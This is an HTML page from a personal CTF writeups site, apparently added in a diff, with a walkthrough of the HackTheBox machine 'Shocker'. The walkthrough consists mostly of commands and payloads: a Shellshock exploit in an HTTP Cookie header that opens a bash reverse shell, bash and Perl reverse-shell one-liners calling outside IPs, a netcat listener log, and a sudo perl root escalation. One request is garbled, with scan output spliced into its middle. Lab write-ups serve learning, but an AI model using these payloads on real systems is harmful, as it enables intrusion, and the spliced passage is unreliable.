@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE-edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+	<title>test</title>
+	<link rel="stylesheet" href="../../../../css/style.css" />
+	<style>
+		h1 {
+			color: #00ff00;
+			/* change the color of the main heading */
+		}
+
+		h3 {
+			color: #ff00ff;
+			/* change the color of the subheadings */
+		}
+
+		a {
+			color: #ffffff;
+			/* change the color of the links */
+			text-decoration: none;
+			/* remove underlines from links */
+		}
+	</style>
+</head>
+
+<body>
+	<header class="writeups">
+		<h1 class="neon textHeading">Writeups - Notes - CTF's</h1>
+			<h3 class="links2-custom">
+				·
+				<a href="https://twitter.com/AnonHack3r" class="custom-link2">Twitter</a>
+				·
+				<a href="https://www.youtube.com/@AnonHack3r_1337" class="custom-link2">YouTube</a>
+				·
+				<a href="https://app.hackthebox.com/profile/480696" class="custom-link2">AnonHack3r</a>
+				·
+			</h3>
+	</header>
+	
+	<main class="topics-container">
+		<div >
+			<p>
+				<h1 class="custom-heading neon" data-value="HackTheBox Writeups">HackTheBox Writeups</h1>
+			</p>
+		</div>
+		<div class="writeupNotes">
+			<h1 id="nmap-scan">Nmap Scan</h1>
+			<div style="text-align: left; font-size: medium;">
+			<p>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+				| http-methods:  
+				|_  Supported Methods: POST OPTIONS GET HEAD
+				|_http-server-header: Apache/2.4.18 (Ubuntu)
+				|<em>http-title: Site doesn&#39;t have a title (text/html).<br><br>
+				2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+				| ssh-hostkey:  
+				|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+				|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+				|</em>  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+			</div>
+			<p>gobuster dir -u <website> -w Wordlist small.txt
+					now in cgi-bin/ use -x option and find sh,pl for sh scripts and perl scripts. </p>
+			<p>Use burp </p>
+			<p>GET /cgi-bin/user.sh HTTP/1.1
+				Host: localhost:8081
+				Cookie: () { :;}; echo; /b<p>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+				| http-methods:  
+				|_  Supported Methods: POST OPTIONS GET HEAD
+				|_http-server-header: Apache/2.4.18 (Ubuntu)
+				|<em>http-title: Site doesn&#39;t have a title (text/html).
+					2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+					| ssh-hostkey:  
+					|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+					|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+					|</em>  256 e6:ac:27:a3in/bash -c ls
+				Connection: close</p>
+			<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+			<p>GET /cgi-bin/user.sh HTTP/1.1
+				Host: localhost:8081
+				Cookie: () { :;}; echo; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.242/8082 0&gt;&amp;1
+				Connection: close</p>
+			<p>Now you have a rev shell</p>
+			<p>bob@kali:~/Desktop/Ethical_Hacking/shocker$ nc -nlvp 8082
+				listening on [any] 8082 ...
+				connect to [10.10.14.242] from (UNKNOWN) [10.10.10.56] 59806
+				bash: no job control in this shell
+				shelly@Shocker:/usr/lib/cgi-bin$
+				&#39;</p>
+			<p> Now we have use check for sudo priv.</p>
+			<p> shelly@Shocker:/home/shelly$ sudo -l
+				sudo -l
+				Matching Defaults entries for shelly on Shocker:
+				   env_reset, mail_badpass,
+				   secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin </p>
+			<p>User shelly may run the following commands on Shocker:
+				   (root) NOPASSWD: /usr/bin/perl</p>
+			<p>You can either get a rev shell </p>
+			<p>perl -e &#39;use
+				Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh
+				-i&quot;);};&#39;</p>
+			<p>or do </p>
+			<p>sudo /usr/bin/perl -e ‘exec(&quot;/bin/bash&quot;)’</p>
+			<p>boom #</p>
+		</div>
+		
+		<div class="container">
+			<div class="terminal-box">
+				<div class="terminal-body">
+					<div style="text-align: center;"></div>
+					<img src="../../../../example.svg" class="example-svg">
+					<div class="space">
+						<p></p>
+					</div>
+					<div style="display: flex; flex-direction: column; align-items: center;">
+						<p class="command-text"><br>For a list of the commands, type<br>
+							<span class="help-txt">"help"</span>
+						</p>
+						<div
+							<div class="cursor">
+								<input id="text" class="txt-input" placeholder="Type something..." autocapitalize="off"
+									autocorrect="off" inputmode="text">
+								<p></p>
+								<i></i>
+							</div>
+						</div>
+					</div>
+					<div class="content"></div>
+				</div>
+			</div>
+		</div>
+		<div class="badge">
+			<!-- BADGES -->
+			<p>
+				<img src="https://img.shields.io/github/last-commit/AnonHack3r1337/CTF?color=red&style=flat-square">
+				<!-- BADGES -->
+			</p>
+		</div>
+		
+	</main>
+
+	<footer class="footerWithContact">
+		<div class="contactMe">
+			<!-- Footer content here -->
+			<p>Contact Me
+				
+			</p>
+		</div>
+		<div >
+			<p>
+			<a href="https://twitter.com/AnonHack3r" class="DM">
+			<span>
+				Direct Message on Twitter
+			</span>
+			</a>
+			</p>
+			<p></p>
+		</div>
+		<p></p>
+	</footer>
+
+	<script src="../../../../js/main.js"></script>
+</body>
+
+</html>
+
+
